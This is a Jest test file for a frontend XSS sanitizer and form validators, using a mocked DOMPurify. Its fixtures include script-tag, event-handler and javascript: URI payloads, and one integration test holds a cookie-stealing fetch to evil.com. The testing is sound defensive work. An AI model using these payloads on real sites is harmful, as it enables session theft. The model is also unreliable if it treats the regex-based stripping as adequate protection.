/**
 * Frontend XSS Sanitization Tests (Jest)
 * 
 * Tests the sanitize.js module to ensure proper XSS protection
 * in the frontend JavaScript code.
 */

import { jest } from '@jest/globals';

// Mock module imports since we're testing in isolation
const mockSanitize = {
    sanitizeText: async (input, options = {}) => {
        if (typeof input !== 'string') return '';
        if (input.length === 0) return '';
        
        // Use the mocked DOMPurify
        const sanitized = global.DOMPurify.sanitize(input, {
            ALLOWED_TAGS: [],
            ALLOWED_ATTR: [],
            KEEP_CONTENT: true,
            ...options
        });
        
        return sanitized
            .replace(/javascript:/gi, '')
            .replace(/vbscript:/gi, '')
            .replace(/data:/gi, '')
            .replace(/on\w+=/gi, '')
            .trim();
    },
    
    setSafeTextContent: (element, content) => {
        if (!element || typeof content !== 'string') return;
        element.textContent = '';
        const textNode = document.createTextNode(content);
        element.appendChild(textNode);
    },
    
    validateAnnotationLabel: (label) => {
        if (typeof label !== 'string') return false;
        const LABEL_PATTERN = /^[A-Za-z0-9 _-]{1,50}$/;
        return LABEL_PATTERN.test(label);
    },
    
    validateAnnotatorId: (annotatorId) => {
        if (typeof annotatorId !== 'string') return false;
        const ID_PATTERN = /^[A-Za-z0-9_-]{1,100}$/;
        return ID_PATTERN.test(annotatorId);
    },
    
    validateNotes: (notes) => {
        if (!notes) return true;
        if (typeof notes !== 'string') return false;
        return notes.length <= 1000 && 
               !/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi.test(notes);
    },
    
    sanitizeFormData: async (formData) => {
        const sanitized = {};
        
        for (const [key, value] of Object.entries(formData)) {
            if (typeof value === 'string') {
                sanitized[key] = await mockSanitize.sanitizeText(value);
            } else {
                sanitized[key] = value;
            }
        }
        
        if (sanitized.label && !mockSanitize.validateAnnotationLabel(sanitized.label)) {
            throw new Error('Invalid label format. Only alphanumeric characters, spaces, underscores, and hyphens allowed (1-50 chars).');
        }
        
        if (sanitized.annotator_id && !mockSanitize.validateAnnotatorId(sanitized.annotator_id)) {
            throw new Error('Invalid annotator ID format. Only alphanumeric characters, underscores, and hyphens allowed (1-100 chars).');
        }
        
        if (sanitized.notes && !mockSanitize.validateNotes(sanitized.notes)) {
            throw new Error('Invalid notes. Maximum 1000 characters, no script tags allowed.');
        }
        
        return sanitized;
    }
};

describe('Frontend XSS Sanitization', () => {
    
    beforeEach(() => {
        // Reset DOM
        document.body.innerHTML = '';
        jest.clearAllMocks();
    });
    
    describe('sanitizeText function', () => {
        
        test('removes script tags completely', async () => {
            const testCases = [
                {
                    input: '<script>alert("xss")</script>Hello',
                    expected: 'Hello'
                },
                {
                    input: 'Hello<script>alert("xss")</script>World',
                    expected: 'HelloWorld'
                },
                {
                    input: '<SCRIPT>alert("xss")</SCRIPT>',
                    expected: ''
                },
                {
                    input: '<script type="text/javascript">alert("xss")</script>Safe text',
                    expected: 'Safe text'
                },
                {
                    input: 'Before<script>evil()</script>Middle<script>more_evil()</script>After',
                    expected: 'BeforeMiddleAfter'
                }
            ];
            
            for (const testCase of testCases) {
                const result = await mockSanitize.sanitizeText(testCase.input);
                expect(result).toBe(testCase.expected);
            }
        });
        
        test('removes dangerous protocols', async () => {
            const testCases = [
                {
                    input: 'javascript:alert("xss")',
                    expected: ''
                },
                {
                    input: 'Click here: javascript:alert("xss")',
                    expected: 'Click here: '
                },
                {
                    input: 'vbscript:msgbox("xss")',
                    expected: ''
                },
                {
                    input: 'data:text/html,<script>alert("xss")</script>',
                    expected: 'text/html,alert("xss")'
                }
            ];
            
            for (const testCase of testCases) {
                const result = await mockSanitize.sanitizeText(testCase.input);
                expect(result).toBe(testCase.expected);
            }
        });
        
        test('removes event handlers', async () => {
            const testCases = [
                {
                    input: '<div onclick="alert(1)">Click me</div>',
                    expected: 'Click me'
                },
                {
                    input: 'onmouseover="alert(1)" some text',
                    expected: ' some text'
                },
                {
                    input: 'Text with onload="evil()" handler',
                    expected: 'Text with  handler'
                }
            ];
            
            for (const testCase of testCases) {
                const result = await mockSanitize.sanitizeText(testCase.input);
                expect(result).toBe(testCase.expected);
            }
        });
        
        test('handles empty and null inputs safely', async () => {
            expect(await mockSanitize.sanitizeText('')).toBe('');
            expect(await mockSanitize.sanitizeText(null)).toBe('');
            expect(await mockSanitize.sanitizeText(undefined)).toBe('');
            expect(await mockSanitize.sanitizeText(123)).toBe('');
        });
        
        test('preserves safe text content', async () => {
            const safeTexts = [
                'Hello World',
                'User-123_test',
                'Safe text with spaces',
                'Numbers 12345 and symbols _-',
            ];
            
            for (const safeText of safeTexts) {
                const result = await mockSanitize.sanitizeText(safeText);
                expect(result).toBe(safeText);
            }
        });
    });
    
    describe('setSafeTextContent function', () => {
        
        test('prevents HTML parsing by using textContent', () => {
            const element = document.createElement('div');
            const maliciousContent = '<script>alert("xss")</script><img src=x onerror=alert("xss2")>';
            
            mockSanitize.setSafeTextContent(element, maliciousContent);
            
            // Should not parse HTML - textContent should contain the literal string
            expect(element.textContent).toBe(maliciousContent);
            expect(element.innerHTML).toBe('&lt;script&gt;alert("xss")&lt;/script&gt;&lt;img src=x onerror=alert("xss2")&gt;');
            
            // Ensure no script tags were actually created
            expect(element.querySelector('script')).toBeNull();
            expect(element.querySelector('img')).toBeNull();
        });
        
        test('handles null element gracefully', () => {
            expect(() => {
                mockSanitize.setSafeTextContent(null, 'test');
            }).not.toThrow();
        });
        
        test('handles non-string content gracefully', () => {
            const element = document.createElement('div');
            
            expect(() => {
                mockSanitize.setSafeTextContent(element, null);
                mockSanitize.setSafeTextContent(element, undefined);
                mockSanitize.setSafeTextContent(element, 123);
            }).not.toThrow();
        });
    });
    
    describe('Form validation functions', () => {
        
        test('validateAnnotationLabel accepts valid labels', () => {
            const validLabels = [
                'person',
                'car',
                'truck_large',
                'person-walking',
                'traffic light',
                'Class123',
                'object_detection_123',
                'A',
                'a' + 'b'.repeat(48) // 49 chars total
            ];
            
            validLabels.forEach(label => {
                expect(mockSanitize.validateAnnotationLabel(label)).toBe(true);
            });
        });
        
        test('validateAnnotationLabel rejects invalid labels', () => {
            const invalidLabels = [
                '',  // Empty
                'a'.repeat(51),  // Too long
                'label@symbol',  // Invalid character
                'label#hash',  // Invalid character
                'label$dollar',  // Invalid character
                '<script>alert(1)</script>',  // Script tag
                'label.with.dots',  // Dots not allowed in labels
                'label/slash',  // Slash not allowed
                'label:colon',  // Colon not allowed
                null,  // Not a string
                undefined,  // Not a string
                123  // Not a string
            ];
            
            invalidLabels.forEach(label => {
                expect(mockSanitize.validateAnnotationLabel(label)).toBe(false);
            });
        });
        
        test('validateAnnotatorId accepts valid IDs', () => {
            const validIds = [
                'user123',
                'user_123',
                'user-123',
                'USER_ID',
                'annotator_1',
                'a',
                'a'.repeat(99) // 99 chars total
            ];
            
            validIds.forEach(id => {
                expect(mockSanitize.validateAnnotatorId(id)).toBe(true);
            });
        });
        
        test('validateAnnotatorId rejects invalid IDs', () => {
            const invalidIds = [
                '',  // Empty
                'a'.repeat(101),  // Too long
                'user@domain.com',  // Invalid character
                'user.name',  // Period not allowed
                'user name',  // Space not allowed
                '<script>alert(1)</script>',  // Script tag
                null,  // Not a string
                undefined,  // Not a string
                123  // Not a string
            ];
            
            invalidIds.forEach(id => {
                expect(mockSanitize.validateAnnotatorId(id)).toBe(false);
            });
        });
        
        test('validateNotes accepts valid notes', () => {
            const validNotes = [
                null,  // Optional field
                undefined,  // Optional field
                '',  // Empty is valid
                'This is a valid note',
                'Note with numbers 123',
                'a'.repeat(1000)  // Exactly 1000 chars
            ];
            
            validNotes.forEach(note => {
                expect(mockSanitize.validateNotes(note)).toBe(true);
            });
        });
        
        test('validateNotes rejects invalid notes', () => {
            const invalidNotes = [
                'a'.repeat(1001),  // Too long
                '<script>alert(1)</script>',  // Script tag
                'Note with <script>evil</script> content',  // Script tag
                123  // Not a string
            ];
            
            invalidNotes.forEach(note => {
                expect(mockSanitize.validateNotes(note)).toBe(false);
            });
        });
    });
    
    describe('sanitizeFormData function', () => {
        
        test('sanitizes all string fields in form data', async () => {
            const formData = {
                label: 'person<script>alert(1)</script>',
                annotator_id: 'user_123',
                notes: 'Safe notes',
                quality_score: 0.9  // Non-string field
            };
            
            const result = await mockSanitize.sanitizeFormData(formData);
            
            expect(result.label).toBe('person');  // Script removed
            expect(result.annotator_id).toBe('user_123');  // Unchanged
            expect(result.notes).toBe('Safe notes');  // Unchanged
            expect(result.quality_score).toBe(0.9);  // Non-string unchanged
        });
        
        test('throws error for invalid label format', async () => {
            const formData = {
                label: 'invalid@label',
                annotator_id: 'user_123'
            };
            
            await expect(mockSanitize.sanitizeFormData(formData))
                .rejects.toThrow('Invalid label format');
        });
        
        test('throws error for invalid annotator ID format', async () => {
            const formData = {
                label: 'person',
                annotator_id: 'invalid@user'
            };
            
            await expect(mockSanitize.sanitizeFormData(formData))
                .rejects.toThrow('Invalid annotator ID format');
        });
        
        test('throws error for invalid notes', async () => {
            const formData = {
                label: 'person',
                annotator_id: 'user_123',
                notes: '<script>alert(1)</script>'
            };
            
            await expect(mockSanitize.sanitizeFormData(formData))
                .rejects.toThrow('Invalid notes');
        });
    });
    
    describe('Integration tests', () => {
        
        test('complete XSS payload is neutralized', async () => {
            const maliciousPayload = {
                label: '<script>document.location="http://evil.com"</script>person',
                annotator_id: 'user<img src=x onerror=alert(1)>123',
                notes: 'Note with <script>fetch("http://evil.com/steal?data="+document.cookie)</script> attack'
            };
            
            // This should fail validation due to invalid characters
            await expect(mockSanitize.sanitizeFormData(maliciousPayload))
                .rejects.toThrow();
        });
        
        test('valid data passes through unchanged', async () => {
            const validData = {
                label: 'person',
                annotator_id: 'user_123',
                notes: 'Clear detection of person walking',
                quality_score: 0.95
            };
            
            const result = await mockSanitize.sanitizeFormData(validData);
            
            expect(result).toEqual(validData);
        });
    });
});

describe('DOM Manipulation Safety', () => {
    
    test('innerHTML usage is properly controlled', () => {
        // Test that our safe innerHTML alternative works
        const container = document.createElement('div');
        const userContent = '<script>alert("xss")</script>Safe content';
        
        mockSanitize.setSafeTextContent(container, userContent);
        
        // Should not execute scripts
        expect(container.innerHTML).not.toContain('<script>');
        expect(container.textContent).toContain('Safe content');
    });
    
    test('element creation is safe', () => {
        // Test creating elements safely
        const card = document.createElement('div');
        card.className = 'card';
        
        const title = document.createElement('h5');
        mockSanitize.setSafeTextContent(title, 'User Title<script>alert(1)</script>');
        
        const body = document.createElement('p');
        mockSanitize.setSafeTextContent(body, 'User content with <img src=x onerror=alert(1)> attack');
        
        card.appendChild(title);
        card.appendChild(body);
        
        // Ensure no scripts were created
        expect(card.querySelector('script')).toBeNull();
        expect(card.querySelector('img')).toBeNull();
        
        // But text content is preserved
        expect(card.textContent).toContain('User Title');
        expect(card.textContent).toContain('User content with');
    });
});
